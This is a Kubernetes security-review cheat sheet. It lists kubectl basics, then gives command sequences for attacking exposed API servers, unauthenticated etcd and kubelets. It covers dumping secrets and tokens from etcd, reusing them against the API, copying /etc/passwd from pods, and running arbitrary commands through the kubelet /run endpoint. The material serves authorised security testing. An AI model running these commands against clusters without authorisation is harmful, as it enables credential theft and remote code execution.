# Kubernetes Security Cheat Sheet

This is a series of commands and manifests that could be useful on Kubernetes security reviews.

# Basic Kubernetes Commands

## List Pods in all namespaces

This will list all pods in the cluster (assuming you have rights to list pods)

```
kubectl get pods --all-namespaces
```

## List namespaces

This will list all namespaces in the cluster

```
kubectl get ns
```

## List pods in the kube-system namespaces

This will list all pods in the `kube-system` namespace

```
kubectl get po -n kube-system
```

## Extracting information in other formats

You can and `-o json` or `-o yaml` to get commands to get more detailed information in one of those formats.  This command will list all pods in the cluster in json format.

```
kubectl get po --all-namespaces -o json
```


# Creating Pods

## Running a pod in a cluster

This command will run an interactive pod in the default namespace based on the `raesene/alpine-containertools` image on Docker hub and place you in an `ash` shell in the pod.  The pod name will be `mycontainer` plus a randomly assigned suffix.

```
kubectl run -it mycontainer --image=raesene/alpine-containertools /bin/ash
```

## Running a pod using a manifest

This YAML manifest will create a basic pod inside the cluster

```
apiVersion: v1
kind: Pod
metadata:
  name: basicpod
  labels:
spec:
  containers:
  - name: basicpod
    image: raesene/alpine-containertools
```

If this is saved as `basicpod.yml`, running the command below will create a pod in the default namespace of the cluster called basicpod using the docker hub image `raesene/alpine-containertools`

```
kubectl create -f basicpod.yml
```

Then once you've done with the pod, you can delete it with

```
kubectl delete -f basicpod.yml
```

# Kubectl Useful commands

## Kubectl proxy

This command will expose the Kubernetes API on `127.0.0.1:8001` without authentication allowing you to use `curl` or similar to explore it

```
kubectl proxy
```

## kubectl port-forward

You can use `kubectl` to get access to any port running in any pod in the cluster (assuming you have pod/exec rights)

The command below will forward port 80/TCP from inside a pod called `webserver` to port 8099/TCP on the localhost interface of the client system

```
kubectl port-forward webserver 8099:80
```

## kubectl cp

You can copy files directly out of any pod that you have pod/exec rights to using `kubectl cp`.

The command below copies a file called `/etc/passwd` from inside a pod called `webserver` to the current directory of the client machine.

```
kubectl cp webserver:/etc/passwd ./passwd
```

# Testing Kubernetes Components

## Ports to look for

`443/TCP` OR `6443/TCP` OR `8443/TCP` - Kubernetes API server with TLS
`8080/TCP` - Insecure API server
`2379/TCP` - etcd client communications
`2380/TCP` - etcd server-server communications
`10250/TCP` - kubelet Read/Write
`10255/TCP` - kubelet Read-only

## Attacking the Kubernetes API server

You can attempt to access an API server without credentials using this command

```
kubectl --insecure-skip-tls-verify -shttps://[IP]:[PORT] get po
```

## Attacking the Kubernetes Insecure Port

If this is accessible over the network you can easily run kubectl commands

```
kubectl -shttp://[IP]:8080 get po
```

## Attacking etcd

First step is generally to check whether `etcd` is available over an unencrypted port, which indicates (usually) that it's available unauthenticated

```
curl http://[IP]:2379/version
```

If that returns data it's generally possible to extract any information that is in the database.  Get the `etcdctl` client installed then do the following.  First set this env var to put etcdctl into v3 mode.

```
export ETCDCTL_API=3
```

```
etcdctl --insecure-transport=true\
--endpoints=http://[IP]:2379\
get / --prefix --keys-only
```

This lists all the keys in the database, you can then pick one of the secrets and dump out the JWT token.  For example the command below

```
etcdctl --insecure-transport=true\
--endpoints=https://[IP]:2379\
get /registry/secrets/kube-system/default-token-abs45
```

You can then use the token with the API server. As a demonstration the following curl command 

```
curl -k -H "Authorization: Bearer [TOKEN]" https://[IP]:6443
```

##  Attacking the Kubelet Read-Only

Info. disclosure with kubelet read-only should be straight-forward as it has no authentication.

```
curl http://IP:10255/pods/ 
```

## Attacking the Kubelet Read/Write

An initial test to see if the R/W kubelet is available unauthenticated is

```
curl https://[IP]:10250/runningpods/ -k
```

If this returns data find the `namespace` pod `name` and container `name` for one of the returned pods and fill in the blanks in this command

```
curl https://[IP]:10250/run/[Namespace]/[Pod]/[Container] -k -XPOST -d "cmd=whoami"
```

You can replace the whoami with any command to execute that code on the host via the kubelet.

